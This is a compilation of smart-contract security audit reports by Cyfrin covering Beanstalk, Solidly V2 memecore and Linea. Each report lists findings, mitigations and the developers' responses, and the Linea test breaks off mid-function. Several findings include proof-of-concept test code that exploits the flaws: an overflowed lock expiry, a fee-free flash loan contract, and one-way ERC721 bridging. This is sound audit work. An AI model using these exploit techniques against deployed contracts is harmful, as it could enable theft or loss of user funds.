There are instances in [`LibWell::getTwaReservesFromBeanstalkPump`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Well/LibWell.sol#L242) and [`LibWell::getTwaLiquidityFromBeanstalkPump`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Well/LibWell.sol#L262) where the time-weighted average reserves are read directly from the Beanstalk Pump. Unlike the implementation in [`LibWellMinting::twaDeltaB`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Minting/LibWellMinting.sol#L160), these functions do not wrap the call in a `try/catch` block. This should not affect the Beanstalk Sunrise mechanism as the execution of `LibWell::getTwaReservesFromStorageOrBeanstalkPump` will not reach the [invocation](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Well/LibWell.sol#L228) of `LibWell::getTwaReservesFromBeanstalkPump`, since here the reserves are already set in storage, but consider handling Pump failure gracefully so that [`LibEvaluate::calcLPToSupplyRatio`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibEvaluate.sol#L222) and [`SeasonGettersFacet::getBeanEthTwaUsdLiquidity`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonGettersFacet.sol#L227-L232) (which is also used in [`SeasonGettersFacet::getTotalUsdLiquidity`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/sun/SeasonFacet/SeasonGettersFacet.sol#L238-L240)) do not revert if there is an issue.


### Use of average grown stalk per BDV is not correctly documented

The nature of the Gauge Point system is to distribute new stalk among whitelisted LP and BEAN deposits based on their Bean-denominated value (BDV). The average grown stalk per BDV also takes into account the BDV of unripe assets, linked to their respective underlying asset based on the following ratio:

$$\frac{paidFertilizer}{mintedFertilzier} \times \frac{totalUnderlying(urAsset)}{supply(urAsset)}$$

While considering the BDV of unripe assets for the average grown stalk per BDV is mathematically correct, this metric lacks practical sense due to a portion of the average grown stalk per BDV never being issued, causing it to lose its semantic meaning.

```solidity
// LibGauge::updateGrownStalkEarnedPerSeason
uint256 totalBdv = totalLpBdv.add(beanDepositedBdv);
...
uint256 newGrownStalk = uint256(s.seedGauge.averageGrownStalkPerBdvPerSeason)
    .mul(totalBdv) // This BDV does not include unripe asset BDV
    .div(BDV_PRECISION);
```

As can be seen, the clear intention of this calculation is to issue `newGrownStalk` for a season but only take into account the BDV corresponding to whitelisted LPs and BEAN. Given that it is never issued, the rest of the grown stalk per BDV could be considered implicitly burned. This design decision should be better documented, making it clear how the unissued grown stalk is considered.


### Consolidate unnecessary code duplication in `ConvertFacet::_withdrawTokens`

`ConvertFacet::_withdrawTokens` duplicates the following code in [L119-132](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L119-L132) then again in [L137-151](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/ConvertFacet.sol#L137-L151):

```solidity
if (a.tokensRemoved.add(amounts[i]) < maxTokens) {
    //keeping track of stalk removed must happen before we actually remove the deposit
    //this is because LibTokenSilo.grownStalkForDeposit() uses the current deposit info
    // @audit start duplicated code
    depositBDV = LibTokenSilo.removeDepositFromAccount(
        msg.sender,
        token,
        stems[i],
        amounts[i]
    );
    bdvsRemoved[i] = depositBDV;
    a.stalkRemoved = a.stalkRemoved.add(
        LibSilo.stalkReward(
            stems[i],
            LibTokenSilo.stemTipForToken(token),
            depositBDV.toUint128()
        )
    );
    // @audit end duplicated code

} else {
    amounts[i] = maxTokens.sub(a.tokensRemoved);

    // @audit start duplicated code
    depositBDV = LibTokenSilo.removeDepositFromAccount(
        msg.sender,
        token,
        stems[i],
        amounts[i]
    );

    bdvsRemoved[i] = depositBDV;
    a.stalkRemoved = a.stalkRemoved.add(
        LibSilo.stalkReward(
            stems[i],
        LibTokenSilo.stemTipForToken(token),
            depositBDV.toUint128()
        )
    );
    // @audit end duplicated code
}
```

Consider refactoring to remove the duplicated code by changing the `if` condition to only update `amounts[i]` when required then perform the same processing that is currently on each `if/else` branch:

```solidity
while ((i < stems.length) && (a.tokensRemoved < maxTokens)) {
    if (a.tokensRemoved.add(amounts[i]) >= maxTokens) {
        amounts[i] = maxTokens.sub(a.tokensRemoved);
    }

    //keeping track of stalk removed must happen before we actually remove the deposit
    //this is because LibTokenSilo.grownStalkForDeposit() uses the current deposit info
    depositBDV = LibTokenSilo.removeDepositFromAccount(
        msg.sender,
        token,
        stems[i],
        amounts[i]
    );
    bdvsRemoved[i] = depositBDV;
    a.stalkRemoved = a.stalkRemoved.add(
        LibSilo.stalkReward(
            stems[i],
            LibTokenSilo.stemTipForToken(token),
            depositBDV.toUint128()
        )
    );

    a.tokensRemoved = a.tokensRemoved.add(amounts[i]);
    a.bdvRemoved = a.bdvRemoved.add(depositBDV);

    depositIds[i] = uint256(LibBytes.packAddressAndStem(token, stems[i]));
    i++;
}
```


\clearpage
## Gas Optimization


### Break out of `LibWhitelist ` loops early once the condition is met

Once the given address is found in the array passed to `LibWhitelist::checkTokenInArray` or `LibWhitelist::checkTokenNotInArray`, these functions could break early to avoid potentially unnecessary additional loop iterations.

```diff
/**
 * @notice Checks whether a token is in an array.
 */
function checkTokenInArray(address token, address[] memory array) private pure {
    // verify that the token is in the array.
    bool success;
    for (uint i; i < array.length; i++) {
-        if (token == array[i]) success = true;
+        if (token == array[i]) {
+            success = true;
+            break;
+        }
    }
    require(success, "Whitelist: Token not in whitelisted token array");
}

/**
 * @notice Checks whether a token is in an array.
 */
function checkTokenNotInArray(address token, address[] memory array) private pure {
    // verify that the token is not in the array.
    bool success = true;
    for (uint i; i < array.length; i++) {
-        if (token == array[i]) success = false;
+        if (token == array[i]) {
+            success = false;
+            break;
+        }
    }    require(success, "Whitelist: Token in incorrect whitelisted token array");
}
```


### `LibBytes::packAddressAndStem` calculated twice with the same parameters

`LibSilo::_removeDepositsFromAccount` [calls](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L597) `LibBytes::packAddressAndStem` after `LibTokenSilo::removeDepositFromAccount` has [already called](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibTokenSilo.sol#L239) the same function with the same parameters.

Consider refactoring to calculate `LibBytes::packAddressAndStem` once for each loop iteration in `LibSilo::_removeDepositsFromAccount`, then pass the result as a parameter in the call to `LibTokenSilo::removeDepositFromAccount`.


### `LibTokenSilo::stemTipForToken` calculated multiple times with same parameter

`LibTokenSilo::stemTipForToken` is calculated multiple times with the same [parameter](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/Silo/LibSilo.sol#L604) in `LibSilo::_removeDepositsFromAccount`. This wastes gas since `LibTokenSilo::stemTipForToken` is always called with the same `token` parameter during bulk withdrawals, performing 4 SLOAD operations on storage that does not change.

Consider calculating the stem tip once before entering the loop then pass the result as a parameter to `stalkReward()`.

The same issue also occurs in `ConvertFacet::_withdrawTokens`.


### `SiloFacet::transferDeposits` should only call `LibSiloPermit::_spendDepositAllowance` once

`SiloFacet::transferDeposits` currently loops through the input `amounts` array and [calls](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/silo/SiloFacet/SiloFacet.sol#L185) `LibSiloPermit::_spendDepositAllowance` once for each `amounts[i]`.

Instead, consider having a `totalAmount` stack variable that is incremented for each `amounts[i]` when looping through the inputs. Then, after the initial loop is complete, call `LibSiloPermit::_spendDepositAllowance` with `totalAmount` to save a significant number of storage reads & writes.

Consider this simplified example using Foundry:
```solidity
uint256 s_allowance = 10;

function _spendAllowance(uint256 amount) private {s_allowance-=amount;}

function testBulkTransfer1() public {
    // prepare input
    uint256[10] memory amounts;
    for(uint256 i=0; i<10; i++){amounts[i] = 1;}

    // function implementation; update storage 1-by-1
    for (uint256 i = 0; i < amounts.length; ++i) {
        _spendAllowance(amounts[i]);
    }

    assert(s_allowance == 0);
}

function testBulkTransfer2() public {
    // prepare input
    uint256[10] memory amounts;
    for(uint256 i=0; i<10; i++){amounts[i] = 1;}

    // function implementation; cache total amount, update storage once
    uint256 totalSpend;
    for (uint256 i = 0; i < amounts.length; ++i) {
        totalSpend += amounts[i];
    }

    _spendAllowance(totalSpend);

    assert(s_allowance == 0);
}

[PASS] testBulkTransfer1() (gas: 5494)
[PASS] testBulkTransfer2() (gas: 3435)
```


### Cache updated remaining amount to prevent extra storage read

`FundraiserFacet::fund` should save the calculated [`remaining - amount`](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/field/FundraiserFacet.sol#L124) then use it to set storage in [L125](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/field/FundraiserFacet.sol#L125) and to check for completion in [L128](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/beanstalk/field/FundraiserFacet.sol#L128); this prevents re-reading storage again in L128. One easy solution is to reuse the existing `remaining` stack variable:

```solidity
remaining = remaining - amount; // Note: SafeMath is redundant here.
s.fundraisers[id].remaining = remaining;
emit FundFundraiser(msg.sender, id, amount);

// If completed, transfer tokens to payee and emit an event
if (remaining == 0) {
    _completeFundraiser(id);
}
```

Consider this simplified example using Foundry:
```solidity
uint256 private s_remainingDebt = 10;

function _onDebtRepayment() private {}

function testRemaining1() public {
    uint256 repaymentAmount = 10;

    // update storage
    s_remainingDebt -= repaymentAmount;

    // use storage read for check
    if(s_remainingDebt == 0) {
        _onDebtRepayment();
    }

    assert(s_remainingDebt == 0);
}

function testRemaining2() public {
    uint256 repaymentAmount = 10;

    // cache remaining debt
    uint256 remainingDebt = s_remainingDebt - repaymentAmount;
    // update storage
    s_remainingDebt = remainingDebt;

    // use cache for check
    if(remainingDebt == 0) {
        _onDebtRepayment();
    }

    assert(s_remainingDebt == 0);
}

[PASS] testRemaining1() (gas: 621)
[PASS] testRemaining2() (gas: 563)
```


### Cache recapitalized amount to prevent extra storage read

`LibFertilizer::remainingRecapitalization` should cache `s.recapitalized` then use the cached stack variable in [L166-167](https://github.com/BeanstalkFarms/Beanstalk/blob/dfb418d185cd93eef08168ccaffe9de86bc1f062/protocol/contracts/libraries/LibFertilizer.sol#L166-L167) to prevent reading the same value a second twice from storage.

\clearpage

------ FILE END car/reports_md/2024-05-02-cyfrin-beanstalk-bip-39-v1-2.md ------


------ FILE START car/reports_md/2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md ------

**Lead Auditors**

[Giovanni Di Siena](https://twitter.com/giovannidisiena)

**Assisting Auditors**

[Hans](https://twitter.com/hansfriese)


---

# Findings
## Medium Risk


### Locks can be created with expiry in the past

**Description:** Due to a silent overflow in [`SolidityV2ERC42069::lockToken`](https://github.com/SolidlyLabs/v2-core/blob/757b18ad05780d2af22018b0c2c9d59422dc59d3/contracts/SolidlyV2-memecore.sol#L387), a sufficiently large duration will cause the unlock date to be in the past. This could allow the caller to create a fraudulent lock, advertising that they have locked for the maximum duration but which can actually be withdrawn immediately. However, the impact is somewhat limited as this will be visible to anyone who calls [`SolidityV2ERC42069::getLock(s)`](https://github.com/SolidlyLabs/v2-core/blob/757b18ad05780d2af22018b0c2c9d59422dc59d3/contracts/SolidlyV2-memecore.sol#L459-L471) with the owner's address (perhaps in a UI). From the attacker's perspective, the extension functionality could ideally be used to wrap around at will, hiding this malicious intent; however, this is not possible due to the checked math revert when incrementing the date.

**Impact:** This bug has a high likelihood of being abused with a more limited impact; therefore, it is categorized as a medium-severity finding.

**Proof of Concept:** Append this test to `MultiTest.js`:
```javascript
it("lock can be created in the past", async function () {
  const { user1, test0, test1, router, pair } = await loadFixture(deploySolidlyV2Fixture);

  let token0 = test0;
  let token1 = test1;

  // Approve tokens for liquidity provision
  await token0.connect(user1).approve(router.address, ethers.constants.MaxUint256);
  await token1.connect(user1).approve(router.address, ethers.constants.MaxUint256);

  // Provide liquidity
  await router.connect(user1).addLiquidity(
    token0.address,
    token1.address,
    ethers.utils.parseUnits("100", 18),
    ethers.utils.parseUnits("100", 18),
    0,
    0,
    user1.address,
    ethers.constants.MaxUint256
  );

  const liquidityBalance = await pair.balanceOf(user1.address);

  let blockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;

  let maxUint128 = ethers.BigNumber.from("340282366920938463463374607431768211455");

  // Lock LP tokens
  await pair.connect(user1).lockToken(user1.address, liquidityBalance, maxUint128.sub(blockTimestamp));


  let ret = await pair.getLock(user1.address, 0);
  expect(ret.date).to.be.eq(0);
});
  ```
**Recommended Mitigation:** Cast the timestamp to `uint128` prior to performing the addition rather than unsafely downcasting the result of the addition:

```diff
locks[from].push(LockData({
    amount: uint128(amount - fee),
-     date: uint128(block.timestamp + duration)
+     date: uint128(block.timestamp) + duration
}));
```

**Solidly Labs:** Fixed in commit [14533e7](https://github.com/SolidlyLabs/v2-core/tree/14533e758f42009ca1d2cf4e98e2e7f33bcd4538).

**Cyfrin:** Verified. The timestamp is first cast to `uint128` prior to performing the addition.

\clearpage
## Low Risk


### Accounts blocked by the token cannot claim their fees

**Description:** In `SolidlyV2`, liquidity providers accrue fees from trades made in the pool. These fees are bound to the account holding the liquidity position at the time of trading as the fees are synced on transfers.

When the liquidity provider wants to claim their fees they call `SolidlyV2Pair::claimFees`:
```solidity
if (feeState.feeOwed0 > 1) {
    amount0 = feeState.feeOwed0 - 1;
    _safeTransfer(token0, msg.sender, uint256(amount0));
    feesClaimedLP0 += amount0;
    feesClaimedTotal0 += amount0;
    feeState.feeOwed0 = 1;
}
```
Here the tokens are transferred to `msg.sender`.

The issue is that some tokens, such as `USDC`, have block lists where some accounts are blocked from receiving or doing transfers. Were this to happen to `msg.sender`, they would never be able to claim their fees, and these funds would be locked in the pool indefinitely.

**Impact:** If an account is blocked by, for example, `USDC,` the user will not be able to claim their fees.

**Recommended Mitigation:** Add a parameter `address to` to `SolidlyV2Pair::claimFees` so that the fees can be transferred to a different account.

**Solidly Labs:** Acknowledged.

**Cyfrin:** Acknowledged.


### Consider a two-step ownership transfer

**Description:** In the `SolidtlyV2-memecore` contracts the owner is set as `msg.sender` in `SolidlyV2Factory` when deployed.

It can also be changed using `SolidlyV2Factory::setOwner`:
```solidity
    function setOwner(address _newOwner) external {
        require(msg.sender == owner);
        owner = _newOwner;
    }
```

Here there's a risk that the owner is lost if the new address not correct. This would result in some functionality not being available, like assigning new copilots and adjusting fees.

**Impact:** The `owner` can mistakenly be given to an account that is out of the protocol's control.

**Recommended Mitigation:** Consider implementing a two-step ownership transfer where `owner` first sets a `pendingOwner` then the `pendingOwner` can accept the new ownership , like OpenZeppelin [`Ownable2Step`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)

**Solidly Labs:** Acknowledged.

**Cyfrin:** Acknowledged.


### `SolidlyV2Pair::setPoolFee` fails to adequately consider fee setters defined by `SolidlyV2Factory`

**Description:** If a new `feeSetter` is registered by the owner of `SolidlyV2Factory`, then it is possible for the pool fee to be set below the minimum specified by the factory. This breaks the invariant that the pool fee should always be between the defined min/max values since it is only possible for the protocol to influence this value by explicitly modifying it on the factory itself, whereas a fee setter can modify it on the pool directly to become out of sync with the factory.

```solidity
function setPoolFee(uint16 _poolFee) external {
    require(ISolidlyV2Factory(factory).isFeeSetter(msg.sender) || msg.sender == copilot, 'UA');
    if (msg.sender == copilot) {
        require(_poolFee >= ISolidlyV2Factory(factory).minFee() && !copilotRevoked); // minimum fee enforced for copilot
    } else {
        require(!protocolRevoked);
    }
    require(_poolFee <= 1000); // pool fee capped at 10%
    uint16 feeOld = poolFee;
    poolFee = _poolFee;
    emit SetPoolFee(feeOld, _poolFee);
}
```

Additionally, if the owner of `SolidlyV2Factory` calls `SolidlyV2Pair::revokeFeeRole`, then registered fee setters are no longer able to call `SolidlyV2Pair::setPoolFee` despite no explicit consideration of fee setters.

**Impact:**
- The pool fee can become out of sync with `SolidlyV2Factory::minFee`.
- Fee setters cannot set fees once the protocol has revoked its fee role.

**Proof of Concept:**
```javascript
it("fee below min", async function () {
  const { user1, factory, pair } = await loadFixture(deploySolidlyV2Fixture);

  await factory.setFeeSetter(user1.address, true);
  pair.connect(user1).setPoolFee(0);
  await factory.minFee().then(minFee => console.log(`SolidlyV2Factory::minFee: ${minFee}`));
  await pair.poolFee().then(poolFee => console.log(`SolidlyV2Pair::poolFee: ${poolFee}`));

  await pair.revokeFeeRole();
  const minFee = await factory.minFee();
  await expect(pair.connect(user1).setPoolFee(minFee)).to.revertedWithoutReason();
});
```

**Recommended Mitigation:** Explicitly handle calls from fee setters as distinct from the factory owner in `SolidlyV2Pair::setPoolFee`, also enforcing that the pool fee cannot be set below the defined global minimum.

**Solidly Labs:** Acknowledged. Both these things are like this by design  `feeSetters` are not constrained by `minFee`, and both protocol and `feeSetter` are considered the same for revoke.

**Cyfrin:** Acknowledged.

\clearpage
## Informational


### Flash loans can be taken for free

**Description:** Unlike other AMM implementations, `SolidlyV2Pair` calculates fees independently for each underlying pool token. Showing just the `amount0Out` calculation:
```solidity
if (amount0Out > 0) {
    uint256 amount1In = balance1 - (_reserve1 - amount1Out);
    uint256 fee1 = _updateFees(1, amount1In, _poolFee, _protocolRatio);
    _k(balance0, balance1 - fee1, uint256(_reserve0), uint256(_reserve1));
    _updateReserves(balance0, (balance1 - fee1));
    _emitSwap(0, amount1In, amount0Out, amount1Out, to);
}
```

Since it is only possible to swap a single token, say `token0`, only `token0Out` will be non-zero. Since `amount1Out` is `0` the calculation `uint256 amount1In = balance1 - (_reserve1 - amount1Out);` will yield `amount1In = 0`. Hence, no fee will be charged.

**Impact:** This has a high likelihood, but it is up to the project to determine the impact of being able to take flash swaps for free.

**Proof of Concept:** Add this test to `MultiTest.js`:
```javascript
it("charges no fee for flashloans", async function () {
const { user1, test0, test1, router, pair } = await loadFixture(deploySolidlyV2Fixture);

let token0 = test0;
let token1 = test1;


// Approve tokens for liquidity provision
await token0.connect(user1).approve(router.address, ethers.constants.MaxUint256);
await token1.connect(user1).approve(router.address, ethers.constants.MaxUint256);

// Provide liquidity
await router.connect(user1).addLiquidity(
  token0.address,
  token1.address,
  ethers.utils.parseUnits("100", 18),
  ethers.utils.parseUnits("100", 18),
  0,
  0,
  user1.address,
  ethers.constants.MaxUint256
);

const FlashRecipient = await ethers.getContractFactory("FlashRecipient");
const flashRecipient = await FlashRecipient.deploy(token0.address, pair.address);

// doesn't revert
await flashRecipient.takeFlashloan();
});
```

with this file in `contracts/test/FlashRecipient.sol`:
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

import {SolidlyV2Pair} from "../SolidlyV2Pair.sol";
import {IERC20} from "./IERC20.sol";

contract FlashRecipient {

    IERC20 public token0;
    SolidlyV2Pair public pair;

    constructor(address _token0, address _pair) {
        token0 = IERC20(_token0);
        pair = SolidlyV2Pair(_pair);
    }

    function takeFlashloan() external {
        pair.swap(1e18, 0, address(this), "data");
    }

    function solidlyV2Call(address , uint256 amount0Out, uint256, bytes memory) external returns (bool) {
        // no fee being paid
        token0.transfer(msg.sender, amount0Out);
        return true;
    }
}
```


**Recommended Mitigation:** Calculate the fee for both sides, but only call `_updateFees()` if they have changed.

**Solidly Labs:** Acknowledged. Flashloans are not a big market, especially with memecoins, we see more potential benefits in leaving them free of charge.

**Cyfrin:** Acknowledged.


### Lack of events emitted for state changes

**Description:** Events are useful to track contract changes off-chain. Hence emitting events for state changes is very valuable for off-chain monitoring and tracking of on-chain state.

**Impact:** Important state changes can be missed in monitoring and off chain tracing.

**Recommended Mitigation:** Consider emitting events for:
* `SolidlyV2Factory::setOwner`
* `SolidlyV2Factory::setFeeCollector`
* `SolidlyV2Factory::setFeeSetter`
* `SolidlyV2Pair::setCopilot`
* `SolidlyV2Pair::revokeFeeRole`

Also consider emitting a special event when tokens are burnt (but kept tracked for fee accrual):
* `SolidlyV2ERC42069::transferZero`
* `SolidlyV2ERC42069::transferZeroFrom`

**Solidly Labs:** Partially fixed. Most important events are covered, added `OwnerChanged` on factory. We're very constrained by bytecode space.

**Cyfrin:** Acknowledged.


### Secondary markets for LP tokens are problematic

**Description:** Unlike other AMM implementations, where fees are accrued in the LP token, Solidly V2 implements an accrual system where the fees are tracked in `feeGrowthGlobal0`/`1` per LP token. Each liquidity provider can call `SolidlyV2Pair::claimFees` to collect their accrued fees, with the benefit being that a liquidity provider does not have to burn their position to access the fees they have accrued.

Fee accrual is synced with every action that changes the balance: when claiming fees, mints, locks, and, most importantly, on any transfer of LP tokens or locked or burnt positions. This means that the fees accrued are bound to the account holding the liquidity position at that time.

Therefore, if these tokens are traded or used as collateral on secondary markets, the fees accrued while in escrow would be lost as these contracts cannot, without modification and knowledge of the Solidly V2 Memecore system, claim fees.

**Impact:** Using Solidly V2 Memecore LP tokens in AMMs, such as within Solidly V2 itself, or different escrow/collateral style contracts will cause fees to be lost.

**Recommended Mitigation:** Be clear about this behavior in the documentation. For the LP tokens to be safely used in a pool of any sort, these would need an ERC-4626-style wrapper vault to be developed. The locked/burnt positions are not so concerning as they would need a custom-built implementation to be traded anyway, which would cater to this in its development..

**Solidly Labs:** Acknowledged. Secondary markets for memecoin LPs are close to non-existent anyway. The most important functions with meme LP tokens are directly available in the core contracts.

**Cyfrin:** Acknowledged.


### Users can hide liquidity in low-duration locks

**Description:** One of the main features of SolidlyV2-memecore is the ability to lock liquidity for a period of time. This will transfer the liquidity to a `LockBox` contract, where it will be locked until the expiry (which is specified when locking).

This liquidity still accrues fees for the holder but is technically held by the `LockBox` contract. Thus `balanceOf` will show `0` for the account having the lock.

This could be used to "hide" liquidity as a user could have a lock with a `0` duration and then, when needing the liquidity, just withdraw the lock.

**Impact:** A user could use locks to "hide" liquidity since a normal ERC20 `balanceOf` will not show it. However, there appears to be no clear way of abusing this, and hence, this is only for your information.

**Recommended Mitigation:** If this is a concern, consider including locked liquidity as part of the `balanceOf`. This would break the ERC20 accounting, though, as the tokens would be double-counted on both the `LockBox` balance and the account balance.

**Solidly Labs:** Acknowledged. Users can check that it's expired or close to expiry.

**Cyfrin:** Acknowledged.


### Lock creation can be front-run

**Description:** `SolidlyV2ERC42069::lockToken` can be front-run with the transfer of a dust lock. This would cause the index at which the lock is created to be different from what the sender expected when sending the transaction.

In the worst case, this could cause the wrong lock to be withdrawn, extended, or split. If the sender is attentive, this can be easily remedied, but it could waste the gas cost for one TX.

**Impact:** The index at which a lock is created/split/transferred can be something other than expected.

**Recommended Mitigation:** Consider mentioning in the documentation that the user needs to use the events emitted to verify at which index their lock was created.

**Solidly Labs:** Acknowledged.

**Cyfrin:** Acknowledged.

\clearpage
## Gas Optimizations


### Cache domain separator and only recompute if the chain ID has changed

For greater gas efficiency, it is recommended that the current chain ID be cached on contract creation and that the domain separator be recomputed only if a change of chain ID is detected (i.e., ` block.chainid` != cached chain ID). An example can be seen in the implementation of [`Solmate::ERC20`](https://github.com/transmissions11/solmate/blob/c892309933b25c03d32b1b0d674df7ae292ba925/src/tokens/ERC20.sol).

**Solidly Labs:** Acknowledged.

**Cyfrin:** Acknowledged.


------ FILE END car/reports_md/2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md ------


------ FILE START car/reports_md/2024-05-24-cyfrin-linea.md ------

**Lead Auditors**

[Dacian](https://twitter.com/DevDacian)


**Assisting Auditors**

  


---

# Findings
## High Risk


### Deprecated variable `L1MessageServiceV1::__messageSender` is still used making `TokenBridge::completeBridging` revert for older messages preventing users from receiving bridged tokens

**Description:** In `L1MessageServiceV1`, this [comment](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/l1/v1/L1MessageServiceV1.sol#L27) indicates that `_messageSender` storage variable is deprecated in favor of transient storage.

However the deprecated `_messageSender` is [updated](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/l1/v1/L1MessageServiceV1.sol#L122) in `L1MessageServiceV1::claimMessage` and also [set](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/l1/L1MessageService.sol#L68) in `L1MessageService::__MessageService_init`. But `L1MessageService::claimMessageWithProof` does [use](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/l1/L1MessageService.sol#L142) the transient storage method.

`MessageServiceBase::onlyAuthorizedRemoteSender` [calls](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/MessageServiceBase.sol#L52-L57) `L1MessagingService::sender` to retrieve the message sender and this function always [fetches](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/messageService/l1/L1MessageService.sol#L166-L168) it from transient storage and not from the deprecated `_messageSender`.

`MessageServiceBase::onlyAuthorizedRemoteSender` in turn is used by `TokenBridge`::[setDeployed](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/tokenBridge/TokenBridge.sol#L302) and [`completeBridging`](https://github.com/Consensys/zkevm-monorepo/blob/364b64d2a2704567adac00e3fa428a1901717666/contracts/contracts/tokenBridge/TokenBridge.sol#L241).

**Impact:** Older L2->L1 messages using `claimMessage` to call `TokenBridge::setDeployed` and `completeBridging` will always revert since:
* the message sender will be fetched from transient storage
* `claimMessage` never sets message sender in transient storage as it still updates the deprecated `_messageSender` storage variable

As `completeBridging` will always revert for these transactions, users will never receive their bridged tokens.

**Recommended Mitigation:** Change `L1MessageServiceV1::claimMessage` to store message sender in transient storage and remove all uses of deprecated `_messageSender`.

**Linea:**
Fixed in commit [55d936a](https://github.com/Consensys/zkevm-monorepo/pull/3191/commits/55d936a47ca31952cc65cc9ee1c7629b919c6aa2#diff-e9f6a0c3577321e5aa88a9d7e12499c2c4819146062e33a99576971682396bb5R122-R144) merged in [PR3191](https://github.com/Consensys/zkevm-monorepo/pull/3191/files#diff-e9f6a0c3577321e5aa88a9d7e12499c2c4819146062e33a99576971682396bb5R119-R141).

**Cyfrin:** Verified.


### `TokenBridge::bridgeToken` allows 1-way `ERC721` bridging causing users to permanently lose their nfts

**Description:** `TokenBridge::bridgeToken` is only intended to support `ERC20` tokens however it quite happily accepts `ERC721` tokens and is able to successfully bridge them over to the L2. But when users attempt to bridge back to the L1 this always reverts resulting in user nfts being permanently stuck inside the `TokenBridge` contract.

This was not introduced in the latest changes but is present in the current mainnet `TokenBridge` [code](https://github.com/Consensys/linea-contracts/blob/main/contracts/tokenBridge/TokenBridge.sol).

**Proof of Concept:** Add new file `contracts/tokenBridge/mocks/MockERC721.sol`:
```solidity
// SPDX-License-Identifier: Apache-2.0
pragma solidity ^0.8.0;

import { ERC721 } from "@openzeppelin/contracts/token/ERC721/ERC721.sol";

contract MockERC721 is ERC721 {
  constructor(string memory _tokenName, string memory _tokenSymbol) ERC721(_tokenName, _tokenSymbol) {}

  function mint(address _account, uint256 _tokenId) public returns (bool) {
    _mint(_account, _tokenId);
    return true;
  }
}
```

Add this new test to `test/tokenBridge/E2E.ts` under the `Bridging` section:
```typescript
it("Can erroneously bridge ERC721 and can't bridge it back", async function () {
  const {
    user,
    l1TokenBridge,
    l2TokenBridge,
    tokens: { L1DAI },
    chainIds,
  } = await loadFixture(deployContractsFixture);

  // deploy ERC721 contract
  const ERC721 = await ethers.getContractFactory("MockERC721");
  let mockERC721 = await ERC721.deploy("MOCKERC721", "M721");
  await mockERC721.waitForDeployment();

  // mint user some NFTs
  const bridgedNft = 5;
  await mockERC721.mint(user.address, 1);
  await mockERC721.mint(user.address, 2);
  await mockERC721.mint(user.address, 3);
  await mockERC721.mint(user.address, 4);
  await mockERC721.mint(user.address, bridgedNft);

  const mockERC721Address = await mockERC721.getAddress();
  const l1TokenBridgeAddress = await l1TokenBridge.getAddress();
  const l2TokenBridgeAddress = await l2TokenBridge.getAddress();

  // user approves L1 token bridge to spend nft to be bridged
  await mockERC721.connect(user).approve(l1TokenBridgeAddress, bridgedNft);

  // user bridges their nft
  await l1TokenBridge.connect(user).bridgeToken(mockERC721Address, bridgedNft, user.address);

  // verify user has lost their nft which is now owned by L1 token bridge
  expect((await mockERC721.ownerOf(bridgedNft))).to.be.equal(l1TokenBridgeAddress);

  // verify user has received 1 token on the bridged erc20 version which
  // the token bridge created
  const l2TokenAddress = await l2TokenBridge.nativeToBridgedToken(chainIds[0], mockERC721Address);
  const bridgedToken = await ethers.getContractFactory("BridgedToken");
  const l2Token = bridgedToken.attach(l2TokenAddress) as BridgedToken;

  const l2ReceivedTokenAmount = 1;

  expect(await l2Token.balanceOf(user.address)).to.be.equal(l2ReceivedTokenAmount);
  expect(await l2Token.totalSupply()).to.be.equal(l2ReceivedTokenAmount);

  // now user attempts to bridge back which fails
  await l2Token.connect(user).approve(l2TokenBridgeAddress, l2ReceivedTokenAmount);
